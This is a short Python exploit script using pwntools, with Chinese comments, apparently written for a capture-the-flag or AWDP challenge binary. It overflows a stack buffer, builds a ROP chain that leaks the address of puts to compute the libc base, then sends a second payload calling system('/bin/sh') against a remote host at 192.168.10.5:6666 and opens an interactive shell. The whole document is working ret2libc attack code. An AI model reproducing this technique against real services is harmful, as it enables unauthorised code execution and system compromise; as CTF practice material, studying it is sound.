from pwn import *

# 忽略由于字符串和字节类型混用而产生的警告
warnings.filterwarnings("ignore", category=BytesWarning)

context(arch="amd64", os="linux")  # 设置 pwntools 的上下文环境为 Linux 的 amd64 架构

# 设置目标二进制文件和对应的 libc 版本的路径
fileName = "./pwn-awdp.bak"
LibcName = "./libc-2.31.so"


elf = ELF(fileName)  # 加载目标二进制文件
libc = ELF(LibcName)  # 加载对应的 libc 文件

# 初始化 ROP 对象，用于搜索和构建 ROP chains
rop = ROP(elf)

# 自动查找并定义'pop rdi; ret'和'ret'这两个 gadgets 的地址
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

# 从二进制文件中获取 puts 函数在 PLT 和 GOT 中的地址
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

# 定义一个返回到 main 或特定函数的地址，用于 ROP 链的构造
main_return_addr = 0x400847

# 判断是本地测试还是远程攻击，并相应地启动进程或连接
local = False
debug = True

p = process(fileName) if local else remote("192.168.10.5", 6666)

# 构造第一次 payload，用于泄露 puts 函数在 libc 中的地址
padding = b"2" * (0x06 + 0x8)  # 根据假定的缓冲区大小进行填充
payload1 = (
    padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_return_addr)
)
p.sendlineafter(b"What should your character's name be: ", b"name")
p.sendlineafter(b"Input 1, 2, 3, or 4: ", b"2")
p.sendlineafter(b"Input 1, 2, 3, or 4: ", payload1)
p.sendline(payload1)
# 接收并处理泄露的 puts 函数地址
puts_leaked = u64(p.recvuntil(b"\x7f")[-6:] + b"\x00\x00")
libc_base = puts_leaked - libc.symbols["puts"]  # 计算 libc 的基地址

# 使用 libc 基地址和 libc 文件中的符号计算 system 函数和"/bin/sh"字符串的真实地址
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))

# 构造第二次 payload，用于执行 system("/bin/sh") 获取 shell
payload2 = padding + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload2)  # 发送第二次 payload
# p.sendline(b"cat flag")  # 发送命令以打印 flag
p.interactive()  # 进入交互模式，允许用户与 shell 交互
